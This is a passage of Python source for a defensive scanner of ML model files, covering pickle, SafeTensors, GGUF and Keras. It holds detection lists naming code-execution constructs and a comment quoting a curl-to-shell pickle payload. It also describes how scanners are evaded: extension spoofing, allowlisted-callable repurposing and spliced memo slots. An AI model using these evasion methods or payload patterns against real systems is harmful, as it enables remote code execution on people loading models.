        elif fmt == ModelFormat.KERAS:
            return self._scan_keras(file_path)
        elif fmt == ModelFormat.PYTORCH_ZIP:
            return self._scan_pytorch_zip(file_path)
        elif fmt == ModelFormat.ONNX:
            return self._scan_onnx(file_path, data)
        elif fmt == ModelFormat.TF_SAVEDMODEL:
            return self._scan_tf_savedmodel(file_path, data)
        elif fmt == ModelFormat.KERAS_METADATA:
            return self._scan_keras_metadata(file_path, data)
        elif fmt == ModelFormat.NUMPY:
            return self._scan_numpy(file_path, data)
        elif fmt == ModelFormat.JOBLIB:
            return self._scan_joblib(file_path, data)
        elif fmt == ModelFormat.SKOPS:
            return self._scan_skops(file_path)
        elif fmt == ModelFormat.TFLITE:
            return self._scan_tflite(file_path, data)
        elif fmt == ModelFormat.SEVENZ:
            return self._scan_7z(file_path)
        elif fmt == ModelFormat.PMML:
            return self._scan_pmml(file_path, data)

        return []

    def _extension_parse_failed(
        self, fmt: ModelFormat, file_path: Path, data: bytes, findings: list[Finding],
    ) -> bool:
        """True if the extension-directed scan of `data` could not
        structurally parse it as `fmt` -- the trigger condition for sniffing
        the bytes against the other known `ModelFormat` signatures.

        Only wired for formats with a reliable "this isn't even structurally
        valid X" signal:
          - SAFETENSORS / GGUF: the scan methods return early with a single
            "corrupted"-flavored finding (MFV-ST-00{1,2,3,4} / MFV-GGUF-00{1,4})
            when the header/magic/JSON doesn't parse -- checking the return
            for that marker is cheaper than re-deriving the same parse.
          - PICKLE (flat, non-zip only): re-run the same opcode walk
            `_scan_pickle` already attempts; an exception there is the
            "not a valid pickle stream" signal.
          - KERAS: neither the HDF5 signature nor the zip-based .keras
            container matched.
          - NUMPY: neither the .npy header nor (for .npz) the zip container
            parsed.

        Deliberately NOT wired for ONNX/TF_SAVEDMODEL or JOBLIB: their scan
        methods degrade to "found nothing" on non-matching bytes rather than
        raising or emitting a dedicated corrupted finding (ONNX/TF's
        schema-less protobuf walker just stops early; joblib always falls
        through to a plain pickle scan of whatever bytes it's given), so
        there's no signal to distinguish "wrong format entirely" from "valid
        but uninteresting file" without risking false MFV-CONFUSE-001s on
        legitimate, sparse files.
        """
        if fmt == ModelFormat.SAFETENSORS:
            return bool(findings) and findings[0].rule_id in {
                "MFV-ST-001", "MFV-ST-002", "MFV-ST-003", "MFV-ST-004",
            }
        if fmt == ModelFormat.GGUF:
            return bool(findings) and findings[0].rule_id in {"MFV-GGUF-001", "MFV-GGUF-004"}
        if fmt == ModelFormat.PICKLE:
            return not self._is_parseable_pickle(data)
        if fmt == ModelFormat.KERAS:
            return data[:8] != HDF5_SIGNATURE and not zipfile.is_zipfile(file_path)
        if fmt == ModelFormat.NUMPY:
            if file_path.suffix.lower() == ".npz":
                return not zipfile.is_zipfile(file_path)
            return self._parse_npy_header(data) is None
        return False

    def _confuse_finding(
        self, file_path: Path, extension_fmt: ModelFormat, sniffed_fmt: ModelFormat,
    ) -> Finding:
        """Build the MFV-CONFUSE-001 finding for a detected extension/content
        mismatch -- same bypass class fickling's PyTorch-polyglot detection
        exists to catch: several real loaders (torch.load, safetensors
        readers, GGUF loaders) sniff magic bytes rather than trusting the
        extension, so a file MFV would otherwise wave through as "corrupted,
        skip" can still execute when actually loaded downstream.
        """
        return Finding(
            rule_id="MFV-CONFUSE-001",
            message=(
                f"File has a '{file_path.suffix}' extension (implying {extension_fmt.value} "
                f"format) but its content matches {sniffed_fmt.value} magic bytes/structure "
                f"instead, and failed to parse as {extension_fmt.value}. Possible "
                f"extension-spoofing to evade format-specific scanning -- the real content "
                f"was re-scanned as {sniffed_fmt.value} below."
            ),
            severity=Severity.HIGH,
            category=Category.AI_ML,
            file_path=str(file_path),
            start_line=0,
            confidence=0.8,
            engine="mfv",
            metadata={
                "extension_format": extension_fmt.value,
                "sniffed_format": sniffed_fmt.value,
                "extension": file_path.suffix,
            },
        )

    def _is_parseable_pickle(self, data: bytes) -> bool:
        """True if `data` walks as a complete, well-formed pickle opcode
        stream -- shared by `_extension_parse_failed` (is *this* file's
        content a valid pickle?) and `_sniff_format` (does some *other*
        file's content happen to be a valid pickle?) so both call sites
        stay on the identical definition of "parseable" as `_scan_pickle`
        itself uses, rather than each re-deriving it.
        """
        try:
            _resolve_pickle_globals(data)
        except Exception:
            return False
        return True

    def _sniff_format(self, data: bytes) -> ModelFormat | None:
        """Identify which (if any) of the known `ModelFormat` container
        signatures `data` actually matches, independent of any file
        extension -- the magic-byte/structural sniff underlying the
        extension-confusion check in `scan_file`.

        Checked most-specific-first so a format with a strong, cheap
        signature (a fixed magic number) is never shadowed by a looser
        heuristic (the SafeTensors header-size-prefix check, or the
        pickle-opcode-parseability fallback, which will happily "match"
        almost any short byte string that isn't already claimed by
        something more specific). Returns None if nothing matches -- callers
        must treat that as "genuinely unidentifiable", not a positive signal
        for any particular format.
        """
        if len(data) >= 24 and data[:4] == GGUF_MAGIC:
            return ModelFormat.GGUF

        if data[:8] == HDF5_SIGNATURE:
            return ModelFormat.KERAS

        if data[:4] == b"PK\x03\x04":
            # ZIP-based containers (PyTorch checkpoint / .keras / .npz) all
            # share the same local-file-header magic -- only the archive's
            # member names actually distinguish them.
            try:
                with zipfile.ZipFile(io.BytesIO(data)) as zf:
                    names = zf.namelist()
            except (zipfile.BadZipFile, OSError):
                return None
            if any(n.rsplit("/", 1)[-1] == "data.pkl" or n.endswith((".pkl", ".pickle")) for n in names):
                return ModelFormat.PYTORCH_ZIP
            if "config.json" in names:
                return ModelFormat.KERAS
            if names and all(n.endswith(".npy") for n in names):
                return ModelFormat.NUMPY
            # Ambiguous zip container with none of the above markers --
            # most model-file zip confusion in practice is a mislabeled
            # PyTorch checkpoint, so that's the more useful default guess,
            # but re-scanning it will itself find nothing if this guess is
            # wrong (no false "denied global" style finding gets fabricated).
            return ModelFormat.PYTORCH_ZIP

        if data[:6] == self._NPY_MAGIC:
            return ModelFormat.NUMPY

        # SafeTensors' own header-size-prefix heuristic: first 8 bytes are a
        # little-endian u64 header length, followed by that many bytes of
        # valid JSON -- mirrors the validation _scan_safetensors performs,
        # just checked speculatively here instead of raising findings.
        if len(data) >= 8:
            header_size = struct.unpack("<Q", data[:8])[0]
            if 0 < header_size <= 100_000_000 and 8 + header_size <= len(data):
                try:
                    parsed = json.loads(data[8:8 + header_size].decode("utf-8"))
                except (json.JSONDecodeError, UnicodeDecodeError):
                    parsed = None
                if isinstance(parsed, dict):
                    return ModelFormat.SAFETENSORS

        # joblib's compressed variant: a zlib stream that inflates to a
        # parseable pickle. Checked before the bare pickle-opcode fallback
        # since a compressed joblib file's raw bytes won't themselves parse
        # as pickle opcodes.
        if len(data) >= 2 and data[0] == 0x78 and data[1] in (0x01, 0x5E, 0x9C, 0xDA):
            try:
                decompressed = self._decompress_zlib_capped(data, self.MAX_ZIP_MEMBER_BYTES)
            except zlib.error:
                decompressed = None
            if decompressed is not None and self._is_parseable_pickle(decompressed):
                return ModelFormat.JOBLIB

        # Pickle-opcode-parseability as the pickle "signature" -- reuses the
        # same opcode walk _scan_pickle already performs rather than a
        # second parser; if pickletools can walk the full stream without
        # raising, that's as strong a positive signal as this format gets
        # (pickle has no fixed magic number of its own).
        if self._is_parseable_pickle(data):
            return ModelFormat.PICKLE

        # ONNX (ModelProto) / TF SavedModel (GraphDef) are both schema-less
        # protobuf at this point -- neither has a magic number, so this
        # falls back to a structural heuristic on the already-available
        # top-level field walk: GraphDef repeats its `node` field (field 1,
        # length-delimited) once per graph node, often dozens/hundreds of
        # times, while ModelProto's `graph` field (field 7) appears exactly
        # once. Best-effort, same spirit as _extract_protobuf_strings's own
        # "walk it schema-lessly since we don't have the .proto" approach.
        try:
            fields = list(_iter_protobuf_fields(data))
        except RecursionError:
            fields = []
        if fields:
            node_like = sum(1 for fn, wt, _ in fields if fn == 1 and wt == 2)
            if node_like > 5:
                return ModelFormat.TF_SAVEDMODEL
            if any(fn == 7 and wt == 2 for fn, wt, _ in fields):
                return ModelFormat.ONNX

        return None

    def scan_directory(self, root: Path) -> list[Finding]:
        """Recursively scan a directory for model files."""
        findings: list[Finding] = []
        root_resolved = root.resolve()
        # An earlier version matched skip names against substrings of the
        # whole path and excluded only `.git` and `__pycache__`, so it walked
        # the target's installed dependencies. Match on path *components*
        # instead, so a directory whose name merely contains "bundle" is kept.
        skip_dirs = SKIP_DIR_NAMES
        # Directory discovery must cover the same extension set scan_file
        # accepts, including the ambiguous ones it resolves by content sniff --
        # otherwise a pytorch_model.bin is scannable when named directly but
        # invisible to a directory scan, which is how the tool is actually run.
        for ext in (*self._format_map, *self._AMBIGUOUS_EXTENSIONS):
            for f in root.rglob(f"*{ext}"):
                # rglob matches directories too. Model caches routinely name a
                # directory after the file it holds (`<repo>--model.joblib/`),
                # so without this every such directory was handed to scan_file,
                # failed to read, and produced a spurious MFV-SKIP-003.
                if not f.is_file():
                    continue
                try:
                    parts = f.relative_to(root).parts
                except ValueError:
                    parts = f.parts
                if any(p in skip_dirs for p in parts):
                    continue
                # Skip symlinks whose target escapes the scan root, so a
                # hostile repo can't get files outside the target read as
                # model-file findings (CWE-59/22).
                if f.is_symlink():
                    try:
                        resolved = f.resolve()
                        if resolved != root_resolved and root_resolved not in resolved.parents:
                            continue
                    except OSError:
                        continue
                findings.extend(self.scan_file(f))
        return findings

    # ── Pickle scanning ───────────────────────────────────────────

    def _scan_pickle(self, file_path: Path, data: bytes) -> list[Finding]:
        """Scan a pickle file by resolving every GLOBAL/STACK_GLOBAL reference
        to its `module.name` callable and classifying each against an
        allow/deny list, instead of flagging the mere presence of REDUCE-style
        opcodes (which appear in essentially every real pickle -- an
        ``OrderedDict``, a tensor rebuild, ... -- and previously gave a benign
        state_dict the same CRITICAL verdict as actual malware).
        """
        findings: list[Finding] = []

        embedded = _embedded_pickle_denied_globals(data)
        if embedded:
            findings.append(Finding(
                rule_id="MFV-PICKLE-008",
                message=f"Pickle file carries a second pickle stream as a bytes "
                        f"literal, and that inner stream references: "
                        f"{', '.join(embedded)}. Anything handed those bytes "
                        f"deserializes them, so the outer callable does not need "
                        f"to be dangerous itself.",
                severity=Severity.CRITICAL,
                category=Category.DESERIALIZATION,
                file_path=str(file_path),
                start_line=0,
                confidence=0.9,
                cwe_ids=[502],
                engine="mfv",
                metadata={"nested_globals": embedded},
            ))

        try:
            globals_found, resolved_calls, memo_profile = _resolve_pickle_globals(data)
        except Exception as e:
            # Corrupted or non-standard pickle stream -- can't resolve
            # callables, so fall back to a weaker raw-byte signal rather than
            # staying silent. Kept out of the normal (parseable) path because
            # a substring can't distinguish a real dangerous call from an
            # unrelated string, which is what made the old always-on version
            # of this check false-positive-prone.
            logger.debug("Pickle opcode analysis failed for %s: %s", file_path, e)
            raw_hits = [sig.decode(errors="replace") for sig in PICKLE_DANGER_SIGNATURES if sig in data]
            if raw_hits:
                findings.append(Finding(
                    rule_id="MFV-PICKLE-002",
                    message=f"Pickle stream could not be parsed as valid opcodes, but contains "
                            f"suspicious byte patterns: {', '.join(raw_hits[:5])}. Possibly corrupted "
                            f"or an obfuscated/malformed backdoored file.",
                    severity=Severity.HIGH,
                    category=Category.DESERIALIZATION,
                    file_path=str(file_path),
                    start_line=0,
                    confidence=0.5,
                    cwe_ids=[502],
                    engine="mfv",
                    metadata={"signatures": raw_hits, "file_size": len(data), "unparseable": True},
                ))
            else:
                # Silence is correct here, and flagging it was measured to be
                # wrong. "0 globals resolved + no raw signature" is the
                # profile of every *harmless* stream: pickle.dumps(42), and
                # the raw tensor-storage blobs inside every torch checkpoint
                # (the two-byte opener sniff matches float data constantly;
                # tiny-random-t5/distilbert in the clean cache fired this way).
                # Pickle execution requires a GLOBAL/STACK_GLOBAL the loader
                # can reach, and the loader reaches it only through opcodes
                # this same walk reads: a stream with no resolvable global
                # cannot carry a working payload, so there is no evasion to
                # report. This is loader parity, not a blind spot.
                pass
            return findings

        denied = sorted({g for g in globals_found if _classify_pickle_global(g) == "denied"})
        unknown = sorted({g for g in globals_found if _classify_pickle_global(g) == "unknown"})
        allowed = sorted({g for g in globals_found if _classify_pickle_global(g) == "allowed"})

        # Pair each classified ref with the first resolved literal-argument
        # call found for it (if any) -- concrete evidence like
        # os.system('curl ... | sh') is far stronger triage signal than the
        # bare callable name, but a ref that was only ever *referenced*
        # (never reduced/called, or reduced with a non-literal/dynamic
        # argument) still falls back to reporting the callable alone,
        # exactly as before. Multiple distinct literal-arg calls to the same
        # ref are rare in practice; the first one found is kept so the
        # message doesn't balloon if it happens.
        # First call per ref wins, except that a fully-resolved call always
        # beats a partially-resolved one for the same callable -- concrete
        # arguments are strictly better evidence than "this literal appeared
        # somewhere in the argument list".
        calls_by_ref: dict[str, PickleResolvedCall] = {}
        for call in resolved_calls:
            existing = calls_by_ref.get(call.ref)
            if existing is None or (existing.partial_texts and not call.partial_texts):
                calls_by_ref[call.ref] = call

        # An allowlisted *name* does not allowlist its *arguments*.
        #
        # ShadowPickle's "Overwritten Module" variant (arXiv:2607.17503),
        # reported at 63% evasion across ten scanners and 0% detection by both
        # picklescan and ModelScan, never references a dangerous callable at
        # all. It calls `collections.OrderedDict` -- allowlisted here, by
        # picklescan, by ModelScan, and by PyTorch's own weights-only
        # unpickler -- and passes it a *string*. A trojaned `collections`
        # already resident in the victim environment (installed via a `.pth`
        # file that rebinds `sys.modules["collections"]` at interpreter start)
        # executes it. No `os`, no `posix`, no `exec` anywhere in the stream,
        # so every name-based check passes by construction.
        #
        # The generalisation is not another list: it is that the allow list
        # answers "is this callable safe to *name*", which is a different
        # question from "is this callable being handed something no legitimate
        # model would hand it". The same argument-evidence triage already used
        # on the unknown bucket runs here too. `OrderedDict` reconstructing a
        # state dict never receives a shell command, a URL or a filesystem
        # path, whatever `collections` happens to resolve to at load time.
        allowed_evidence: dict[str, tuple[Severity, str]] = {}
        for ref in allowed:
            if _is_ml_constructor_allowed(ref):
                # Config constructors take strings constantly (Pipeline step
                # names, TrainingArguments' output_dir, torch.device('cuda')).
                # The anomalous-string premise is false for the whole class,
                # measured: 24 of 215 benign models tripped it the day these
                # refs became allowed.
                continue
            call = calls_by_ref.get(ref)
            shape_reason = _allowed_call_has_anomalous_string(ref, call)
            if shape_reason is not None:
                allowed_evidence[ref] = (Severity.MEDIUM, shape_reason)
                continue
            verdict = _triage_unknown_pickle_call(call)
            if verdict is not None:
                allowed_evidence[ref] = verdict

        if allowed_evidence:
            details = "; ".join(
                f"{calls_by_ref[ref].format()} [{reason}]"
                for ref, (_sev, reason) in sorted(allowed_evidence.items())
            )
            worst = max(
                (sev for sev, _ in allowed_evidence.values()),
                key=lambda s: list(_PICKLE_UNKNOWN_TIERS).index(s)
                if s in _PICKLE_UNKNOWN_TIERS else -1,
            )
            findings.append(Finding(
                rule_id="MFV-PICKLE-006",
                message=f"Pickle file invokes a known-safe callable with an argument no "
                        f"legitimate model would supply: {details}. The callable's name is on "
                        f"the allow list, which is exactly what makes this worth reporting -- "
                        f"an attacker who can influence the loading environment can repurpose a "
                        f"whitelisted constructor without naming anything dangerous.",
                severity=worst,
                category=Category.DESERIALIZATION,
                file_path=str(file_path),
                start_line=0,
                confidence=0.65,
                cwe_ids=[502],
                engine="mfv",
                metadata={
                    "allowed_globals": sorted(allowed_evidence),
                    "file_size": len(data),
                    "triage": {
                        ref: {
                            "severity": sev.value,
                            "reason": reason,
                            "call": calls_by_ref[ref].format(),
                        }
                        for ref, (sev, reason) in sorted(allowed_evidence.items())
                    },
                },
            ))

        if denied:
            denied_display = [
                calls_by_ref[ref].format() if ref in calls_by_ref else ref
                for ref in denied
            ]
            findings.append(Finding(
                rule_id="MFV-PICKLE-001",
                message=f"Pickle file references unsafe callable(s) that grant code/command "
                        f"execution on load: {', '.join(denied_display)}. These opcodes can execute "
                        f"arbitrary code during deserialization.",
                severity=Severity.CRITICAL,
                category=Category.DESERIALIZATION,
                file_path=str(file_path),
                start_line=0,
                confidence=0.95,
                cwe_ids=[502],
                engine="mfv",
                metadata={
                    "denied_globals": denied,
                    "file_size": len(data),
                    "denied_calls": {ref: calls_by_ref[ref].format() for ref in denied if ref in calls_by_ref},
                },
            ))

        if unknown and not denied:
            unknown_calls = {ref: calls_by_ref[ref].format() for ref in unknown if ref in calls_by_ref}

            # Re-triage the unknown bucket against that argument-level
            # evidence before falling through to the INFO catch-all. Without
            # this, every documented picklescan bypass gadget -- none of
            # which is on any deny list, by construction -- was reported at
            # INFO as "likely a legitimate custom class".
            verdicts: dict[str, tuple[Severity, str]] = {}
            for ref in unknown:
                verdict = _triage_unknown_pickle_call(calls_by_ref.get(ref))
                if verdict is not None:
                    verdicts[ref] = verdict

            # One finding per tier rather than per global, so a file with a
            # dozen escalated globals doesn't produce a dozen findings.
            # Iterating the tier table keeps emission order deterministic.
            for severity, (confidence, lead) in _PICKLE_UNKNOWN_TIERS.items():
                refs = sorted(ref for ref, (sev, _reason) in verdicts.items() if sev == severity)
                if not refs:
                    continue
                details = "; ".join(
                    f"{unknown_calls.get(ref, ref)} [{verdicts[ref][1]}]" for ref in refs
                )
                findings.append(Finding(
                    rule_id="MFV-PICKLE-005",
                    message=f"{lead}: {details}. This verdict comes from the resolved call "
                            f"arguments, not from the callable's name -- these globals are on "
                            f"neither the known-safe nor the known-dangerous list, which is "
                            f"precisely where pickle scanner bypass gadgets live.",
                    severity=severity,
                    category=Category.DESERIALIZATION,
                    file_path=str(file_path),
                    start_line=0,
                    confidence=confidence,
                    cwe_ids=[502],
                    engine="mfv",
                    metadata={
                        "unknown_globals": refs,
                        "file_size": len(data),
                        "triage": {
                            ref: {
                                "severity": severity.value,
                                "confidence": confidence,
                                "reason": verdicts[ref][1],
                                "call": unknown_calls.get(ref),
                            }
                            for ref in refs
                        },
                    },
                ))

            # Whatever survived re-triage keeps the original INFO treatment.
            residual = [ref for ref in unknown if ref not in verdicts]
            residual_calls = {ref: expr for ref, expr in unknown_calls.items() if ref not in verdicts}

            if residual:
                findings.append(Finding(
                    rule_id="MFV-PICKLE-004",
                    message=f"Pickle file references unrecognized global(s) not on the known-safe "
                            f"list: {', '.join(residual[:10])}. Likely a legitimate custom class or "
                            f"model type, but not verifiable by static analysis -- review the source "
                            f"if this file's origin is untrusted.",
                    severity=Severity.INFO,
                    category=Category.DESERIALIZATION,
                    file_path=str(file_path),
                    start_line=0,
                    confidence=0.3,
                    cwe_ids=[502],
                    engine="mfv",
                    metadata={
                        "unknown_globals": residual,
                        "file_size": len(data),
                        "unknown_calls": residual_calls,
                    },
                ))

        if memo_profile.out_of_band:
            # Reported independently of what the globals walk found: this is
            # evidence about how the file was *assembled*, not about what any
            # spliced code does, so it still fires when the payload uses only
            # allow-listed callables and stays silent on a file that merely
            # references something unrecognized.
            oob = memo_profile.out_of_band
            shown = ", ".join(str(i) for i in oob[:5])
            if len(oob) > 5:
                shown += ", ..."
            findings.append(Finding(
                rule_id="MFV-PICKLE-007",
                message=f"Pickle stream writes {len(oob)} memo slot(s) ({shown}) separated by a "
                        f"large gap from the rest of the {memo_profile.slots}-slot memo it uses. "
                        f"Python's picklers number memo slots consecutively, so a single pickle's "
                        f"indices always form one unbroken run -- a hole this size means the stream "
                        f"was not written by one ordinary pickle.dump. It is the signature of a "
                        f"payload spliced into an existing model file with its memo writes offset "
                        f"to avoid colliding with the host's.",
                severity=Severity.HIGH,
                category=Category.DESERIALIZATION,
                file_path=str(file_path),
                start_line=0,
                confidence=0.75,
                cwe_ids=[502],
                engine="mfv",
                metadata={
                    "out_of_band_memo_indices": list(oob[:20]),
                    "out_of_band_count": len(oob),
                    "memo_slots": memo_profile.slots,
                    "max_memo_index": memo_profile.max_index,
                    "file_size": len(data),
                },
            ))

        return findings

    # ── SafeTensors scanning ──────────────────────────────────────

    def _scan_safetensors(self, file_path: Path, data: bytes) -> list[Finding]:
        """Validate SafeTensors format integrity."""
        findings: list[Finding] = []

        if len(data) < 8:
            return [Finding(
                rule_id="MFV-ST-001",
                message="SafeTensors file is too small (< 8 bytes). Corrupted or invalid.",
                severity=Severity.HIGH,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.95,
                engine="mfv",
            )]

        # Read header size (first 8 bytes, little-endian u64)
        header_size = struct.unpack("<Q", data[:8])[0]

        if header_size > 100_000_000:
            return [Finding(
                rule_id="MFV-ST-002",
                message=f"SafeTensors header size ({header_size}) exceeds limit. Possible DoS or malformed file.",
                severity=Severity.HIGH,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.90,
                engine="mfv",
            )]

        if 8 + header_size > len(data):
            return [Finding(
                rule_id="MFV-ST-003",
                message="SafeTensors header extends beyond file boundary. Corrupted or truncated.",
                severity=Severity.HIGH,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.95,
                engine="mfv",
            )]

        # Parse JSON header
        try:
            header = json.loads(data[8:8 + header_size].decode("utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError):
            return [Finding(
                rule_id="MFV-ST-004",
                message="SafeTensors header is not valid JSON. Corrupted or maliciously crafted.",
                severity=Severity.HIGH,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.95,
                engine="mfv",
            )]

        layout_problems = _check_safetensors_layout(
            header, len(data) - 8 - int(header_size))
        if layout_problems:
            findings.append(Finding(
                rule_id="MFV-ST-006",
                message=f"SafeTensors layout arithmetic is inconsistent with the file: "
                        f"{'; '.join(layout_problems[:5])}. Loaders allocate and memcpy "
                        f"from these offsets; a file whose numbers do not fit it is a "
                        f"parser exploit, not a corrupt model.",
                severity=Severity.HIGH,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.8,
                cwe_ids=[787],
                engine="mfv",
                metadata={"layout_problems": layout_problems[:20]},
            ))

        # Validate metadata, flagging suspicious keys
        suspicious_keys: list[str] = []
        for key in header.get("__metadata__", {}):
            if any(d in key.lower() for d in ("__reduce__", "__builtins__", "exec", "eval", "import")):
                suspicious_keys.append(key)

        if suspicious_keys:
            findings.append(Finding(
                rule_id="MFV-ST-005",
                message=f"SafeTensors metadata contains suspicious keys: {', '.join(suspicious_keys)}. "
                        f"These could attempt code execution on load.",
                severity=Severity.CRITICAL,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.90,
                engine="mfv",
                metadata={"suspicious_keys": suspicious_keys},
            ))

        return findings

    # ── GGUF scanning ─────────────────────────────────────────────

    def _scan_gguf(self, file_path: Path, data: bytes) -> list[Finding]:
        """Inspect GGUF metadata for embedded code or suspicious content.

        Parses the actual header + KV metadata structure (magic, version,
        tensor/kv counts, typed entries) instead of decoding the raw file
        and substring-matching across everything -- the old approach matched
        tensor names and binary weight data as readily as real metadata
        values, and couldn't say *which* field a hit came from.
        """
        findings: list[Finding] = []

        if len(data) < 8 or data[:4] != GGUF_MAGIC:
            if data[:4] in GGML_MAGICS:
                # A known format we do not parse, so the honest verdict is
                # non-coverage rather than a claim about the content.
                return [_skip_unverified_finding(
                    file_path,
                    "The file is in GGML format, GGUF's predecessor, which this "
                    "scanner does not parse.",
                    metadata={"skipped_reason": "ggml_format"},
                )]
            return [Finding(
                rule_id="MFV-GGUF-001",
                message="GGUF magic number invalid or missing. Corrupted or non-GGUF file.",
                severity=Severity.HIGH,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.95,
                engine="mfv",
            )]

        layout_problems = _check_gguf_layout(data)
        if layout_problems:
            findings.append(Finding(
                rule_id="MFV-GGUF-005",
                message=f"GGUF container arithmetic is inconsistent with the file: "
                        f"{'; '.join(layout_problems[:5])}. llama.cpp allocates and "
                        f"reads from these counts and dimensions in u64; a file that "
                        f"only fits by wrapping is a parser exploit (CVE-2025-53630, "
                        f"CVE-2026-27940, CVE-2026-33298), not a corrupt model.",
                severity=Severity.HIGH,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.8,
                cwe_ids=[787, 190],
                engine="mfv",
                metadata={"layout_problems": layout_problems[:20]},
            ))

        try:
            kv = _parse_gguf_metadata(data, GGUF_METADATA_SCAN_BYTES)
        except (ValueError, struct.error, IndexError, OverflowError) as e:
            logger.debug("GGUF metadata parse failed for %s: %s", file_path, e)
            if not any(f.rule_id == "MFV-GGUF-005" for f in findings):
                # Only report "could not parse" when the layout pass found
                # nothing structurally wrong. If GGUF-005 already fired,
                # the counting problems were already noted and this adds
                # nothing actionable.
                findings.append(Finding(
                    rule_id="MFV-GGUF-004",
                    message="GGUF magic number is valid, but the metadata KV section could not be "
                            "parsed -- possibly truncated, a non-standard variant, or corrupted. "
                            "Content could not be verified.",
                    severity=Severity.INFO,
                    category=Category.AI_ML,
                    file_path=str(file_path),
                    start_line=0,
                    confidence=0.3,
                    engine="mfv",
                ))
            return findings

        dangerous_patterns: list[tuple[str, str]] = [
            ("__reduce__", "pickle reduce found, code execution possible"),
            ("<class", "Python class reference, potential deserialization risk"),
            ("subprocess", "subprocess reference in model metadata"),
            ("exec(", "exec() call in model metadata"),
            ("eval(", "eval() call in model metadata"),
            ("import(", "dynamic import in model metadata"),
            ("__import__", "__import__ dynamic import, code execution possible"),
            ("__builtins__", "builtins reference, sandbox escape risk"),
        ]

        hits: list[str] = []
        for key, value in kv.items():
            if key in _GGUF_FREETEXT_KEYS:
                continue
            values = value if isinstance(value, list) else [value]
            for v in values:
                if not isinstance(v, str):
                    continue
                for pattern, desc in dangerous_patterns:
                    if pattern in v:
                        hits.append(f"{desc} (metadata key '{key}')")

        if hits:
            findings.append(Finding(
                rule_id="MFV-GGUF-002",
                message=f"GGUF metadata contains suspicious content: {'; '.join(hits[:3])}. "
                        f"Model may have been tampered with.",
                severity=Severity.CRITICAL,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.85,
                engine="mfv",
                metadata={"hits": hits},
            ))

        # Check the actual chat_template metadata value for real SSTI
        # code-execution constructs, rather than the mere presence of "{{" --
        # every legitimate chat-tuned GGUF ships a Jinja2 template using
        # "{{ }}" for ordinary variable substitution (e.g. Llama-3's real
        # template is `{{ message['role'] }}`-shaped), so that alone is not
        # evidence of tampering and would false-positive on nearly every
        # real model. Only flag templates that actually reach for Python's
        # object-introspection/sandbox-escape surface or shell out.
        #
        # Signatures are matched only in code position: inside Jinja
        # expression/statement delimiters, with string literals blanked.
        # Nothing else executes: prose outside the delimiters is rendered
        # verbatim, and a string literal inside a block is data. Real
        # templates collide with the signatures in both places (measured:
        # unsloth's DeepSeek-V4 template trips "os." on the word
        # "scenarios.", both in prose and inside a {{ '...' }} literal).
        chat_template = kv.get("tokenizer.chat_template")
        if isinstance(chat_template, str):
            executable = _GGUF_JINJA_STRING_RE.sub(
                "",
                " ".join(
                    m.group(0)
                    for m in _GGUF_JINJA_BLOCK_RE.finditer(chat_template)
                ),
            )
            ssti_hit = next(
                (sig for sig in _GGUF_CHAT_TEMPLATE_SSTI_SIGNATURES if sig in executable),
                None,
            )
            if ssti_hit is not None:
                findings.append(Finding(
                    rule_id="MFV-GGUF-003",
                    message=f"GGUF tokenizer.chat_template contains a code-execution construct "
                            f"({ssti_hit!r}) inside Jinja2 template syntax. "
                            f"CVE-2026-5760: Malicious model weights/metadata can inject template code for RCE.",
                    severity=Severity.CRITICAL,
                    category=Category.SSTI,
                    file_path=str(file_path),
                    start_line=0,
                    confidence=0.80,
                    cwe_ids=[94, 1336],
                    engine="mfv",
                ))

        return findings

    # ── Keras H5 scanning ─────────────────────────────────────────

    def _scan_keras(self, file_path: Path) -> list[Finding]:
        """Detect Lambda layers and unrecognized custom layer classes in
        Keras H5 files by walking the actual parsed layer graph
        (model_config JSON), instead of substring-matching words like
        "lambda"/"function"/"custom_object" anywhere in the raw HDF5
        container -- which also holds tensor names and weight bytes that can
        spuriously contain those words (e.g. an "activation function" config
        string, or a layer literally named "function").
        """
        try:
            with open(file_path, "rb") as f:
                header = f.read(8)
        except OSError:
            return [_skip_unverified_finding(
                file_path,
                "The file could not be read, so its layer graph was never checked.",
                metadata={"skipped_reason": "unreadable"},
            )]

        # HDF5 signature check
        if header[:8] != HDF5_SIGNATURE:
            # Not HDF5, so try the zip-based .keras format
            return self._scan_keras_zip(file_path)

        try:
            data = file_path.read_bytes()
        except OSError:
            return [_skip_unverified_finding(
                file_path,
                "The file could not be read, so its layer graph was never checked.",
                metadata={"skipped_reason": "unreadable"},
            )]

        config = _extract_keras_model_config(data)
        if config is None:
            # Weights-only H5 (no model_config attribute) -- no layer graph
            # to check; the file contains only numeric tensor data.
            return []

        return self._keras_findings_from_config(file_path, config)

    def _scan_keras_zip(self, file_path: Path) -> list[Finding]:
        """Scan the new .keras format (a zip containing config.json with the
        same class_name/layer-graph shape as the legacy H5 model_config)."""
        try:
            with zipfile.ZipFile(file_path, "r") as zf:
                if "config.json" not in zf.namelist():
                    return []
                raw = zf.read("config.json")
        except zipfile.BadZipFile:
            # Not a zip at all: the extension-confusion check in scan_file
            # owns that case (it re-scans the bytes against every known magic).
            return []
        except (OSError, KeyError):
            return [_skip_unverified_finding(
                file_path,
                "The archive's config.json could not be read, so the layer "
                "graph was never checked.",
                metadata={"skipped_reason": "unreadable_member"},
            )]

        try:
            config = json.loads(raw.decode("utf-8"))
        except (json.JSONDecodeError, UnicodeDecodeError):
            return [_skip_unverified_finding(
                file_path,
                "The archive's config.json does not parse as JSON, so the "
                "layer graph was never checked.",
                metadata={"skipped_reason": "unparseable_config"},
            )]
        if not isinstance(config, dict):
            return []

        return self._keras_findings_from_config(file_path, config)

    def _scan_keras_metadata(self, file_path: Path, data: bytes) -> list[Finding]:
        """Scan a SavedModel's `keras_metadata.pb` for the same risky layer
        graph the `.h5`/`.keras` paths look for.

        The file is a `SavedMetadata` protobuf, but the Keras `model_config`
        it carries is a plain JSON string field, so the existing raw-byte
